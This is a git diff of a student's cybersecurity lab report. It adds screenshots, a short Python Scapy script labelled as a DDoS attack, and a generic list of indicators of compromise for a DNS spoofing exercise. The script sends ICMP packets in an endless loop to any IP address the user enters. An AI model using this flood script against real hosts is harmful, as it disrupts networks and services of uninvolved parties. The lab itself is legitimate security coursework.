@@ -23,14 +23,25 @@ DNS spoofing started
 
 ## b. Use ICMP Packets to perform only DDOS attacks over the victim. 
 
- 
+ ![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/89c1f5d2-9124-4b36-8d05-65e53a5949b9)
 
- 
+![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/e18f5798-923e-4f1d-8cee-9edbf7f36c3c)
 
- 
+from scapy.all import *
 
- 
+# Function to send ICMP packets
+def send_icmp_packet(dst_ip):
+    icmp_packet = IP(dst=dst_ip)/ICMP()
+    send(icmp_packet, loop=True, verbose=False)
 
+# Main function
+def main():
+    target_ip = input("Enter the target IP address: ")
+    while True:
+        send_icmp_packet(target_ip)
+
+if __name__ == "__main__":
+    main()
  
 
 ### 2. Use Splunk to answer the following questions: 
@@ -46,7 +57,18 @@ DNS spoofing started
 
 ## b. Identify and Analyse the Indicator of Compromise for the attack.  
 
- 
+An Indicator of Compromise (IoC) is any piece of evidence or anomaly that suggests a network intrusion or security breach has occurred. IoCs can take various forms, including:
+File Hashes: Hash values of known malicious files or executables found on systems.
+IP Addresses: IP addresses associated with malicious activity, such as command and control servers or sources of malicious traffic.
+Domain Names: Domain names linked to malicious activities, phishing campaigns, or hosting malicious content.
+URLs: URLs used in phishing emails or websites hosting exploit kits or malware payloads.
+File Paths: Unusual file paths or directories commonly used by malware for persistence or data exfiltration.
+Network Traffic Patterns: Anomalous network traffic, such as unusual spikes in DNS queries, connections to known malicious IP addresses, or unexpected outbound traffic.
+System Logs: Suspicious entries in system logs, including failed login attempts, privilege escalations, or unusual system activities.
+For DNS Spoofing Attack IOC can be :
+
+DNS Log Analysis and DNS Traffic Analysis
+File Hash, Suspicious IP Address and anamoulous Login Activity
 
 ## c. Explore and create an Alert for similar attacks in the Future.  
 
